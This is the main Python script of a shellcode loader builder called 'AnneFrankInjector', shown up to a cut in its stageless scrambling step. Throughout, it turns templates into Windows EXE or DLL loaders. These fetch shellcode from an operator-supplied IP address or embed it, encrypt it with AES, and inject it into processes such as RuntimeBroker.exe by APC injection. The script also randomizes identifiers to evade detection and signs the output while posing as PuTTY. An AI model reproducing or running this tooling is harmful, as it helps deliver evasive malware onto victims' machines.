# -*- coding: utf-8 -*-

import os
import sys
import random
import subprocess
import shutil, errno

from importlib import resources
from core.hashing import Hasher
from argparse import ArgumentParser
from core.utils import Colors, banner
from core.encryption import Encryption


def main():

    parser = ArgumentParser(description="AnneFrankInjector", epilog="Author: Excalibra")
    subparsers = parser.add_subparsers(dest="commands", help="Staged or Stageless Payloads", required=True)

    parser_staged = subparsers.add_parser("staged", help="Staged")
    parser_stageless = subparsers.add_parser("stageless", help="Stageless")

    parser_staged.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
    parser_staged.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
    parser_staged.add_argument("-apc", "--apc", type=str, default="RuntimeBroker.exe", help="Target process name for APC injection (e.g., explorer.exe).")

    parser_staged.add_argument("-i", "--ip-address", type=str, help="IP address from where your shellcode is gonna be fetched.", required=True)
    parser_staged.add_argument("-po", "--port", type=int, help="Port from where the HTTP connection is gonna fetch your shellcode.", required=True)
    parser_staged.add_argument("-pa", "--path", type=str, help="Path from where your shellcode uis gonna be fetched. ", required=True)
    parser_staged.add_argument("-o", "--output", type=str, help="Output path where the shellcode is gonna be saved.")

    parser_staged.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
    parser_staged.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
    parser_staged.add_argument("-pfx", "--pfx", type=str, help="Path to the PFX file for signing the loader.")
    parser_staged.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for the PFX file.")
    parser_staged.add_argument("--delay", type=int, default=0, help="Delay in seconds before injection (default 0).")
    parser_staged.add_argument("--spawn", action="store_true", help="Spawn a new process for injection (e.g., notepad.exe)")
    parser_staged.add_argument("--spawn-path", type=str, default="C:\\Windows\\System32\\notepad.exe", help="Path to the executable to spawn for injection.")

    parser_staged.epilog = "Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'"

    parser_stageless.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
    parser_stageless.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
    parser_stageless.add_argument("-apc", "--apc", type=str, default="RuntimeBroker.exe", help="Target process name for APC injection (e.g., explorer.exe).")
    
    parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
    parser_stageless.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
    parser_stageless.add_argument("-pfx", "--pfx", type=str, help="Path to the PFX file for signing the loader.")
    parser_stageless.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for the PFX file.")
    parser_stageless.add_argument("-o", "--output", type=str, help="Output name for the generated loader (without extension).")
    parser_stageless.add_argument("--delay", type=int, default=0, help="Delay in seconds before injection (default 0).")
    parser_stageless.add_argument("--spawn", action="store_true", help="Spawn a new process for injection (e.g., notepad.exe)")
    parser_stageless.add_argument("--spawn-path", type=str, default="C:\\Windows\\System32\\notepad.exe", help="Path to the executable to spawn for injection.")

    parser_stageless.epilog = "Example usage: python main.py stageless -p shellcode.bin -e -s -pfx cert.pfx -pfx-pass 'password'"

    args = parser.parse_args()

    banner()  # banner will need to be updated separately (in core/utils.py)

    # --------------------------------------#
    # ----------- Staged Variant -----------#
    # --------------------------------------#
    if args.commands == "staged":
        
        print(Colors.green("[i] Staged Payload selected."))
        print(Colors.light_yellow("[+] Starting the process..."))

        cr_directory    = os.path.dirname(os.path.abspath(__file__))
        src_directory   = resources.files("templates").joinpath("staged")
        dst_directory   = f'{cr_directory}/.afpacker'

        try:
            shutil.copytree(src_directory, dst_directory)
        except OSError as e:
            if e.errno == errno.EEXIST:
                shutil.rmtree(dst_directory)
                shutil.copytree(src_directory, dst_directory)
            else:
                print(f"Error: {e}")

        if args.payload and args.ip_address and args.port and args.path:

            print(Colors.green("[i] Corresponding template selected.."))

            ip = args.ip_address
            port = args.port
            path = args.path

            with open(f'{dst_directory}/download.c', 'r') as file:
                download_data = file.readlines()

            for i in range(len(download_data)):
                if "#-IP_VALUE-#" in download_data[i]:
                    download_data[i] = download_data[i].replace("#-IP_VALUE-#", ip)
                if "#-PORT_VALUE-#" in download_data[i]:
                    download_data[i] = download_data[i].replace("#-PORT_VALUE-#", str(port))
                if "#-PATH_VALUE-#" in download_data[i]:
                    download_data[i] = download_data[i].replace('#-PATH_VALUE-#', path)

            with open(f'{dst_directory}/download.c', 'w') as file:
                file.writelines(download_data)

            with open(args.payload, "rb") as file:
                payload = file.read()

            INITIAL_SEED = random.randint(5, 20)
            INITIAL_HASH = random.randint(2000, 9000)

            NTDLL_HASH = Hasher.Hasher("NTDLL.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNEL32_HASH = Hasher.Hasher("KERNEL32.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNELBASE_HASH = Hasher.Hasher("KERNELBASE.DLL", INITIAL_SEED, INITIAL_HASH)
            DEBUGACTIVEPROCESSSTOP_HASH = Hasher.Hasher("DebugActiveProcessStop", INITIAL_SEED, INITIAL_HASH)
            CREATEPROCESSA_HASH = Hasher.Hasher("CreateProcessA", INITIAL_SEED, INITIAL_HASH)
            NTMAPVIEWOFSECTION_HASH = Hasher.Hasher("NtMapViewOfSection", INITIAL_SEED, INITIAL_HASH)

            for filename in os.listdir(dst_directory):
                if filename.endswith(".c") or filename.endswith(".h"):
                    with open(f"{dst_directory}/{filename}", "r") as file:
                        data = file.readlines()

                    for i in range(len(data)):
                        if "#-INITIAL_HASH_VALUE-# " in data[i]:
                            data[i] = data[i].replace("#-INITIAL_HASH_VALUE-#", str(INITIAL_HASH))
                        if "#-INITIAL_SEED_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-INITIAL_SEED_VALUE-#", str(INITIAL_SEED))
                        if "#-NTDLL_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-NTDLL_VALUE-#", NTDLL_HASH)
                        if "#-KERNEL32_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-KERNEL32_VALUE-#", KERNEL32_HASH)
                        if "#-KERNELBASE_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-KERNELBASE_VALUE-#", KERNELBASE_HASH)
                        if "#-DAPS_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-DAPS_VALUE-#", DEBUGACTIVEPROCESSSTOP_HASH)
                        if "#-CREATEPROCESSA_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-CREATEPROCESSA_VALUE-#", CREATEPROCESSA_HASH)
                        if "#-NTMVOS_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-NTMVOS_VALUE-#", NTMAPVIEWOFSECTION_HASH)

                    with open(f"{dst_directory}/{filename}", "w") as file:
                        file.writelines(data)

            print(Colors.green("[+] Template files modified !"))

                        # --- Spawn new process injection ---
            if args.spawn:
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            content = f.read()
                        # Replace the placeholder with a macro that enables the spawn code
                        content = content.replace("//#-SPAWN-#", "#define USE_SPAWN")
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(content)
                print(Colors.green("[+] Spawn injection mode enabled."))

            print(Colors.light_yellow("[+] Setting APC injection target process..."))
            if args.format is None or args.format == "EXE":
                with open(f'{dst_directory}/main.c', 'r') as file:
                    main_data = file.readlines()
                    for i in range(len(main_data)):
                        if "#-TARGET_PROCESS-#" in main_data[i]:
                            main_data[i] = main_data[i].replace("#-TARGET_PROCESS-#", args.apc)

                with open(f'{dst_directory}/main.c', 'w') as file:
                    file.writelines(main_data)

            if args.format == "DLL":
                with open(f'{dst_directory}/main_dll.c', 'r') as file:
                    main_data = file.readlines()
                    for i in range(len(main_data)):
                        if "#-TARGET_PROCESS-#" in main_data[i]:
                            main_data[i] = main_data[i].replace("#-TARGET_PROCESS-#", args.apc)

                with open(f'{dst_directory}/main_dll.c', 'w') as file:
                    file.writelines(main_data)

            print(Colors.green(f"[+] Target APC injection process set to {args.apc} !"))

            # --- Add delay if specified ---
            if args.delay > 0:
                delay_ms = args.delay * 1000
                for filename in os.listdir(dst_directory):
                    if filename.startswith("main") and filename.endswith(".c"):
                        main_c_path = os.path.join(dst_directory, filename)
                        with open(main_c_path, "r") as f:
                            lines = f.readlines()
                        # Find the line that calls APCInjection and insert Sleep before it
                        for i, line in enumerate(lines):
                            if "APCInjection(" in line:
                                # Insert Sleep with appropriate indentation
                                indent = line[:len(line)-len(line.lstrip())]
                                lines.insert(i, f"{indent}Sleep({delay_ms});\n")
                                break
                        with open(main_c_path, "w") as f:
                            f.writelines(lines)
                print(Colors.green(f"[+] Added delay of {args.delay} seconds before injection."))

            if args.encrypt:

                print(Colors.green("[i] Encryption selected."))
                print(Colors.light_yellow("[+] Encrypting the payload..."))

                enc_payload, key, iv = Encryption.EncryptAES(payload)

                if os.path.exists(f"{args.output}.bin"):
                    os.remove(f"{args.output}.bin")

                with open(f"{args.output}.bin", "wb") as file:
                    file.write(enc_payload)

                for filename in os.listdir(dst_directory):
                    if filename.startswith("main") and filename.endswith(".c"):
                        with open(f"{dst_directory}/{filename}", "r") as file:
                            main_data = file.readlines()
                    
                        for i in range(len(main_data)):
                            if "#-KEY_VALUE-#" in main_data[i]:
                                main_data[i] = main_data[i].replace("#-KEY_VALUE-#", key)
                            if "#-IV_VALUE-#" in main_data[i]:
                                main_data[i] = main_data[i].replace("#-IV_VALUE-#", iv)

                        with open(f"{dst_directory}/{filename}", "w") as file:
                            file.writelines(main_data)

                print(Colors.green(f"[+] Payload encrypted and saved to {os.getcwd()}/{args.output}.bin !"))

            if args.encrypt is False:

                print(Colors.green("[i] Encryption not selected."))
                print(Colors.light_yellow("[+] Compiling the loader..."))

                for filename in os.listdir(dst_directory):
                    if filename.startswith("main") and filename.endswith(".c"):
                        with open(f"{dst_directory}/{filename}", "r") as file:
                            main_data = file.readlines()

                        for i in range(len(main_data)):
                            if "#include \"AES_128_CBC.h\"" in main_data[i]:
                                main_data[i] = f"//{main_data[i]}"
                            if "AES_CTX" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "uint8_t aes_k[16] = { #-KEY_VALUE-# };" in main_data[i]:
                                main_data[i] = f"//{main_data[i]}"
                            if "uint8_t aes_i[16] = { #-IV_VALUE-# };" in main_data[i]:
                                main_data[i] = f"//{main_data[i]}"
                            if "Starting the decryption..." in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "pClearText = (PBYTE)malloc(sEncPayload);" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "AES_DecryptInit(&ctx, aes_k, aes_i);" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "AES_DecryptBuffer(&ctx, pEncPayload, pClearText, sEncPayload);" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "Payload decrypted at postion: 0x%p with size of %zu" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess))" in main_data[i]:
                                main_data[i] = f"\tif (!APCInjection(hProcess, (PVOID) pEncPayload, sEncPayload, &pProcess)) {{"
                
                    with open(f"{dst_directory}/{filename}", "w") as file:
                        file.writelines(main_data)

                shutil.copy(args.payload, f"{args.output}.bin")

            if args.scramble:

                print(Colors.green("[i] Scrambling selected."))
                print(Colors.light_yellow("[+] Scrambling the loader..."))

                functions = ["HashStringDjb2A", "GetProcAddressH", "GetModuleHandleH", "MapNtdll", "Unhook", "AES_DecryptInit", "AES_DecryptBuffer", 
                             "CreateSuspendedProcess", "APCInjection", "cDAPSu", "cCPAu", "aes_k", "aes_i", "AES_Decrypt", "AES_Encrypt", "AES_EncryptInit",
                             "GetContent", "NTAVM", "NTPVM", "NTWVM", "NTQAT"]
                scrambled_functions = []

                variables = ["sEncPayload", "pEncPayload", "pClearText", "ctx", "hProcess", "pProcess", "dwSizeOfClearText", "dwOldProtect", "dwProcessId"]
                scrambled_variables = []

                alphabet = list("abcdefghijklmnopqrstuvwxyz")
                used_combos = set()

                for sign in functions + variables:
                    letter = random.choice(alphabet)
                    multiplier = random.randint(1, 128)
                    while (letter, multiplier) in used_combos:
                        letter = random.choice(alphabet)
                        multiplier = random.randint(1, 128)
                    used_combos.add((letter, multiplier))
                    scrambled_sign = letter * multiplier

                    if sign in functions:
                        scrambled_functions.append(scrambled_sign)
                    else:
                        scrambled_variables.append(scrambled_sign)
                    
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h") or filename.endswith(".asm"):
                        with open(f"{dst_directory}/{filename}", "r") as file:
                            data = file.readlines()

                        for i in range(len(data)):
                            if "HashStringDjb2A" in data[i]:
                                data[i] = data[i].replace("HashStringDjb2A", scrambled_functions[0])
                            if "GetProcAddressH" in data[i]:
                                data[i] = data[i].replace("GetProcAddressH", scrambled_functions[1])
                            if "GetModuleHandleH" in data[i]:
                                data[i] = data[i].replace("GetModuleHandleH", scrambled_functions[2])
                            if "MapNtdll" in data[i]:
                                data[i] = data[i].replace("MapNtdll", scrambled_functions[3])
                            if "Unhook" in data[i]:
                                data[i] = data[i].replace("Unhook", scrambled_functions[4])
                            if "AES_DecryptInit" in data[i]:
                                data[i] = data[i].replace("AES_DecryptInit", scrambled_functions[5])
                            if "AES_DecryptBuffer" in data[i]:
                                data[i] = data[i].replace("AES_DecryptBuffer", scrambled_functions[6])
                            if "CreateSuspendedProcess" in data[i]:
                                data[i] = data[i].replace("CreateSuspendedProcess", scrambled_functions[7])
                            if "APCInjection" in data[i]:
                                data[i] = data[i].replace("APCInjection", scrambled_functions[8])
                            if "cDAPSu" in data[i]:
                                data[i] = data[i].replace("cDAPSu", scrambled_functions[9])
                            if "cCPAu" in data[i]:
                                data[i] = data[i].replace("cCPAu", scrambled_functions[10])
                            if "aes_k" in data[i]:
                                data[i] = data[i].replace("aes_k", scrambled_functions[11])
                            if "aes_i" in data[i]:
                                data[i] = data[i].replace("aes_i", scrambled_functions[12])
                            if "AES_Decrypt" in data[i]:
                                data[i] = data[i].replace("AES_Decrypt", scrambled_functions[13])
                            if "AES_Encrypt" in data[i]:
                                data[i] = data[i].replace("AES_Encrypt", scrambled_functions[14])
                            if "AES_EncryptInit" in data[i]:
                                data[i] = data[i].replace("AES_EncryptInit", scrambled_functions[15])
                            if "GetContent" in data[i]:
                                data[i] = data[i].replace("GetContent", scrambled_functions[16])
                            if "NTAVM" in data[i]:
                                data[i] = data[i].replace("NTAVM", scrambled_functions[17])
                            if "NTPVM" in data[i]:
                                data[i] = data[i].replace("NTPVM", scrambled_functions[18])
                            if "NTWVM" in data[i]:
                                data[i] = data[i].replace("NTWVM", scrambled_functions[19])
                            if "NTQAT" in data[i]:
                                data[i] = data[i].replace("NTQAT", scrambled_functions[20])               

                        with open(f"{dst_directory}/{filename}", "w") as file:
                            file.writelines(data)

                for filename in os.listdir(dst_directory):
                    if filename.startswith("main") and filename.endswith(".c"):
                        with open(f"{dst_directory}/{filename}", "r") as file:
                            main_data = file.readlines()

                        for i in range(len(main_data)):
                            if "sEncPayload" in main_data[i]:
                                main_data[i] = main_data[i].replace("sEncPayload", scrambled_variables[0])
                            if "pEncPayload" in main_data[i]:
                                main_data[i] = main_data[i].replace("pEncPayload", scrambled_variables[1])
                            if "pClearText" in main_data[i]:
                                main_data[i] = main_data[i].replace("pClearText", scrambled_variables[2])
                            if "ctx" in main_data[i]:
                                main_data[i] = main_data[i].replace("ctx", scrambled_variables[3])
                            if "hProcess" in main_data[i]:
                                main_data[i] = main_data[i].replace("hProcess", scrambled_variables[4])
                            if "pProcess" in main_data[i]:
                                main_data[i] = main_data[i].replace("pProcess", scrambled_variables[5])
                            if "dwSizeOfClearText" in main_data[i]:
                                main_data[i] = main_data[i].replace("dwSizeOfClearText", scrambled_variables[6])
                            if "dwOldProtect" in main_data[i]:
                                main_data[i] = main_data[i].replace("dwOldProtect", scrambled_variables[7])
                            if "dwProcessId" in main_data[i]:
                                main_data[i] = main_data[i].replace("dwProcessId", scrambled_variables[8])  

                        with open(f"{dst_directory}/{filename}", "w") as file:
                            file.writelines(main_data)

                print(Colors.green("[+] Loader scrambled !"))

            if args.format is None or args.format == "EXE":
                if args.pfx:

                    print(Colors.green("[i] Signing selected."))
                    print(Colors.light_yellow("[+] Signing the loader..."))
                    
                    if args.pfx is not None:
                        pfx_path = args.pfx
                    else:
                        print(Colors.red("[!] PFX file not found"))
                        sys.exit(1)

                    if args.pfx_password:
                        pfx_password = args.pfx_password
                    else:
                        print(Colors.red("[!] PFX password not provided"))
                        sys.exit(1)
                    
                    input_binary = "afloader.exe"
                    signed_binary = "afloader_signed.exe"

                    os.system(f"cd '{dst_directory}' && make clean && make FORMAT=EXE")
                    shutil.move(f"{dst_directory}/afloader.exe", f"afloader.exe")

                    if os.path.exists("afloader_signed.exe"):
                        os.remove("afloader_signed.exe")

                    subprocess.run([
                        f"osslsigncode",
                        "sign",
                        "-pkcs12", pfx_path,
                        "-pass", pfx_password,
                        "-n", "Signed Loader",
                        "-i", "https://putty.com",
                        "-t", "http://timestamp.sectigo.com",
                        "-in", input_binary,
                        "-out", signed_binary
                    ], check=True)

                    shutil.rmtree(dst_directory)

                    print(Colors.green("[+] Loader signed !"))

                else:
                    
                    os.system(f"cd '{dst_directory}' && make clean && make FORMAT=EXE")

                    shutil.move(f"{dst_directory}/afloader.exe", f"afloader.exe")

                    shutil.rmtree(dst_directory)

                    print(Colors.green("[+] Loader compiled !"))

                print(Colors.green("[+] DONE !"))

            if args.format == "DLL":

                print(Colors.green("[i] DLL format selected."))

                os.system(f"cd '{dst_directory}' && make clean && make FORMAT=DLL")

                shutil.move(f"{dst_directory}/afloader.dll", f"afloader.dll")

                shutil.rmtree(dst_directory)

                print(Colors.green("[+] Loader compiled !"))

                print(Colors.green("[+] DONE !"))

    # ------------------------------------------#
    # ----------- Stageless Variant -----------#
    # ------------------------------------------#
    if args.commands == "stageless":

        print(Colors.green("[i] Stageless Payload selected."))
        print(Colors.light_yellow("[+] Starting the process..."))

        cr_directory    = os.path.dirname(os.path.abspath(__file__))
        src_directory   = resources.files("templates").joinpath("stageless")
        dst_directory   = f'{cr_directory}/.afpacker'

        try:
            shutil.copytree(src_directory, dst_directory)
        except OSError as e:
            if e.errno == errno.EEXIST:
                shutil.rmtree(dst_directory)
                shutil.copytree(src_directory, dst_directory)
            else:
                print(f"Error: {e}")

        if args.payload:

            with open(args.payload, "rb") as file:
                raw_payload = file.read()

            payload = ', '.join(f"0x{b:02x}" for b in raw_payload)

            INITIAL_SEED = random.randint(5, 20)
            INITIAL_HASH = random.randint(2000, 9000)

            NTDLL_HASH = Hasher.Hasher("NTDLL.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNEL32_HASH = Hasher.Hasher("KERNEL32.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNELBASE_HASH = Hasher.Hasher("KERNELBASE.DLL", INITIAL_SEED, INITIAL_HASH)
            DEBUGACTIVEPROCESSSTOP_HASH = Hasher.Hasher("DebugActiveProcessStop", INITIAL_SEED, INITIAL_HASH)
            CREATEPROCESSA_HASH = Hasher.Hasher("CreateProcessA", INITIAL_SEED, INITIAL_HASH)
            NTMAPVIEWOFSECTION_HASH = Hasher.Hasher("NtMapViewOfSection", INITIAL_SEED, INITIAL_HASH)

            for filename in os.listdir(dst_directory):
                if filename.endswith(".c") or filename.endswith(".h"):
                    with open(f"{dst_directory}/{filename}", "r") as file:
                        data = file.readlines()

                    for i in range(len(data)):
                        if "#-INITIAL_HASH_VALUE-# " in data[i]:
                            data[i] = data[i].replace("#-INITIAL_HASH_VALUE-#", str(INITIAL_HASH))
                        if "#-INITIAL_SEED_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-INITIAL_SEED_VALUE-#", str(INITIAL_SEED))
                        if "#-NTDLL_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-NTDLL_VALUE-#", NTDLL_HASH)
                        if "#-KERNEL32_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-KERNEL32_VALUE-#", KERNEL32_HASH)
                        if "#-KERNELBASE_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-KERNELBASE_VALUE-#", KERNELBASE_HASH)
                        if "#-DAPS_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-DAPS_VALUE-#", DEBUGACTIVEPROCESSSTOP_HASH)
                        if "#-CREATEPROCESSA_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-CREATEPROCESSA_VALUE-#", CREATEPROCESSA_HASH)
                        if "#-NTMVOS_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-NTMVOS_VALUE-#", NTMAPVIEWOFSECTION_HASH)

                    with open(f"{dst_directory}/{filename}", "w") as file:
                        file.writelines(data)

            print(Colors.green("[+] Template files modified !"))

                        # --- Spawn new process injection ---
            if args.spawn:
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            content = f.read()
                        # Replace the placeholder with a macro that enables the spawn code
                        content = content.replace("//#-SPAWN-#", "#define USE_SPAWN")
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(content)
                print(Colors.green("[+] Spawn injection mode enabled."))

            print(Colors.light_yellow("[+] Setting APC injection target process..."))
            if args.format is None or args.format == "EXE":
                with open(f'{dst_directory}/main.c', 'r') as file:
                    main_data = file.readlines()
                    for i in range(len(main_data)):
                        if "#-TARGET_PROCESS-#" in main_data[i]:
                            main_data[i] = main_data[i].replace("#-TARGET_PROCESS-#", args.apc)

                with open(f'{dst_directory}/main.c', 'w') as file:
                    file.writelines(main_data)
                    
            if args.format == "DLL":
                with open(f'{dst_directory}/main_dll.c', 'r') as file:
                    main_data = file.readlines()
                    for i in range(len(main_data)):
                        if "#-TARGET_PROCESS-#" in main_data[i]:
                            main_data[i] = main_data[i].replace("#-TARGET_PROCESS-#", args.apc)

                with open(f'{dst_directory}/main_dll.c', 'w') as file:
                    file.writelines(main_data)

            print(Colors.green(f"[+] Target APC injection process set to {args.apc} !"))

            if args.encrypt:

                print(Colors.green("[i] Encryption selected."))
                print(Colors.light_yellow("[+] Encrypting the payload..."))

                enc_payload, key, iv = Encryption.EncryptAES(raw_payload)

                hex_payload = ', '.join(f"0x{b:02x}" for b in enc_payload)

                for filename in os.listdir(dst_directory):
                    if filename.startswith("main") and filename.endswith(".c"):
                        with open(f"{dst_directory}/{filename}", "r") as file:
                            main_data = file.readlines()

                        for i in range(len(main_data)):
                            if "#-KEY_VALUE-#" in main_data[i]:
                                main_data[i] = main_data[i].replace("#-KEY_VALUE-#", key)
                            if "#-IV_VALUE-#" in main_data[i]:
                                main_data[i] = main_data[i].replace("#-IV_VALUE-#", iv)
                            if "#-PAYLOAD_VALUE-#" in main_data[i]:
                                main_data[i] = main_data[i].replace("#-PAYLOAD_VALUE-#", str(hex_payload))

                        with open(f"{dst_directory}/{filename}", "w") as file:
                            file.writelines(main_data)

                print(Colors.green(f"[+] Payload encrypted and saved into payload[] variable in main.c !"))

            # --- Add delay if specified ---
            if args.delay > 0:
                delay_ms = args.delay * 1000
                for filename in os.listdir(dst_directory):
                    if filename.startswith("main") and filename.endswith(".c"):
                        main_c_path = os.path.join(dst_directory, filename)
                        with open(main_c_path, "r") as f:
                            lines = f.readlines()
                        # Find the line that calls APCInjection and insert Sleep before it
                        for i, line in enumerate(lines):
                            if "APCInjection(" in line:
                                # Insert Sleep with appropriate indentation
                                indent = line[:len(line)-len(line.lstrip())]
                                lines.insert(i, f"{indent}Sleep({delay_ms});\n")
                                break
                        with open(main_c_path, "w") as f:
                            f.writelines(lines)
                print(Colors.green(f"[+] Added delay of {args.delay} seconds before injection."))


            if args.encrypt is False:

                print(Colors.green("[i] Encryption not selected."))
                print(Colors.light_yellow("[+] Compiling the loader..."))

                for filename in os.listdir(dst_directory):
                    if filename.startswith("main") and filename.endswith(".c"):
                        with open(f"{dst_directory}/{filename}", "r") as file:
                            main_data = file.readlines()

                        for i in range(len(main_data)):
                            if "#include \"AES_128_CBC.h\"" in main_data[i]:
                                main_data[i] = f"//{main_data[i]}"
                            if "AES_CTX" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "uint8_t aes_k[16] = { #-KEY_VALUE-# };" in main_data[i]:
                                main_data[i] = f"//{main_data[i]}"
                            if "uint8_t aes_i[16] = { #-IV_VALUE-# };" in main_data[i]:
                                main_data[i] = f"//{main_data[i]}"
                            if "Starting the decryption..." in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "pClearText = (PBYTE)malloc(sEncPayload);" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "AES_DecryptInit(&ctx, aes_k, aes_i);" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "AES_DecryptBuffer(&ctx, &payload, pClearText, sEncPayload)" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "Payload decrypted at postion: 0x%p with size of %zu" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess))" in main_data[i]:
                                main_data[i] = f"\tif (!APCInjection(hProcess, (PVOID) &payload, sEncPayload, &pProcess)) {{"
                            if "#-PAYLOAD_VALUE-#" in main_data[i]:
                                main_data[i] = main_data[i].replace("#-PAYLOAD_VALUE-#", payload)

                        with open(f"{dst_directory}/{filename}", "w") as file:
                            file.writelines(main_data)

            if args.scramble:

                print(Colors.green("[i] Scrambling selected."))
                print(Colors.light_yellow("[+] Scrambling the loader..."))

                functions = ["HashStringDjb2A", "GetProcAddressH", "GetModuleHandleH", "MapNtdll", "Unhook", "AES_DecryptInit", "AES_DecryptBuffer", 
                             "CreateSuspendedProcess", "APCInjection", "cDAPSu", "cCPAu", "aes_k", "aes_i", "AES_Decrypt", "AES_Encrypt", "AES_EncryptInit",
                             "NTAVM", "NTPVM", "NTWVM", "NTQAT"]
                scrambled_functions = []

                variables = ["sEncPayload", "pEncPayload", "pClearText", "ctx", "hProcess", "pProcess", "dwSizeOfClearText", "dwOldProtect", "dwProcessId", "payload"]
                scrambled_variables = []

                alphabet = list("abcdefghijklmnopqrstuvwxyz")
                used_combos = set()

                for sign in functions + variables:
                    letter = random.choice(alphabet)
                    multiplier = random.randint(1, 128)
                    while (letter, multiplier) in used_combos:
                        letter = random.choice(alphabet)
                        multiplier = random.randint(1, 128)
                    used_combos.add((letter, multiplier))
                    scrambled_sign = letter * multiplier

                    if sign in functions:
                        scrambled_functions.append(scrambled_sign)
                    else:
                        scrambled_variables.append(scrambled_sign)
                    
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h") or filename.endswith(".asm"):
                        with open(f"{dst_directory}/{filename}", "r") as file:
                            data = file.readlines()

                        for i in range(len(data)):
                            if "HashStringDjb2A" in data[i]:
                                data[i] = data[i].replace("HashStringDjb2A", scrambled_functions[0])
                            if "GetProcAddressH" in data[i]:
                                data[i] = data[i].replace("GetProcAddressH", scrambled_functions[1])
                            if "GetModuleHandleH" in data[i]:
                                data[i] = data[i].replace("GetModuleHandleH", scrambled_functions[2])
                            if "MapNtdll" in data[i]:
                                data[i] = data[i].replace("MapNtdll", scrambled_functions[3])
                            if "Unhook" in data[i]:
                                data[i] = data[i].replace("Unhook", scrambled_functions[4])
                            if "AES_DecryptInit" in data[i]:
                                data[i] = data[i].replace("AES_DecryptInit", scrambled_functions[5])
                            if "AES_DecryptBuffer" in data[i]:
                                data[i] = data[i].replace("AES_DecryptBuffer", scrambled_functions[6])
                            if "CreateSuspendedProcess" in data[i]:
                                data[i] = data[i].replace("CreateSuspendedProcess", scrambled_functions[7])
                            if "APCInjection" in data[i]:
                                data[i] = data[i].replace("APCInjection", scrambled_functions[8])
                            if "cDAPSu" in data[i]:
                                data[i] = data[i].replace("cDAPSu", scrambled_functions[9])
                            if "cCPAu" in data[i]:
                                data[i] = data[i].replace("cCPAu", scrambled_functions[10])
                            if "aes_k" in data[i]:
                                data[i] = data[i].replace("aes_k", scrambled_functions[11])
                            if "aes_i" in data[i]:
                                data[i] = data[i].replace("aes_i", scrambled_functions[12])
                            if "AES_Decrypt" in data[i]:
                                data[i] = data[i].replace("AES_Decrypt", scrambled_functions[13])
                            if "AES_Encrypt" in data[i]:
                                data[i] = data[i].replace("AES_Encrypt", scrambled_functions[14])
                            if "AES_EncryptInit" in data[i]:
                                data[i] = data[i].replace("AES_EncryptInit", scrambled_functions[15])
                            if "NTAVM" in data[i]:
                                data[i] = data[i].replace("NTAVM", scrambled_functions[16])
                            if "NTPVM" in data[i]:
                                data[i] = data[i].replace("NTPVM", scrambled_functions[17])
                            if "NTWVM" in data[i]:
                                data[i] = data[i].replace("NTWVM", scrambled_functions[18])
                            if "NTQAT" in data[i]:
                                data[i] = data[i].replace("NTQAT", scrambled_functions[19])               

                        with open(f"{dst_directory}/{filename}", "w") as file:
                            file.writelines(data)

                for filename in os.listdir(dst_directory):
                    if filename.startswith("main") and filename.endswith(".c"):
                        with open(f"{dst_directory}/{filename}", "r") as file:
                            main_data = file.readlines()

                        for i in range(len(main_data)):
                            if "sEncPayload" in main_data[i]:
                                main_data[i] = main_data[i].replace("sEncPayload", scrambled_variables[0])
                            if "pEncPayload" in main_data[i]:
                                main_data[i] = main_data[i].replace("pEncPayload", scrambled_variables[1])
                            if "pClearText" in main_data[i]:
                                main_data[i] = main_data[i].replace("pClearText", scrambled_variables[2])
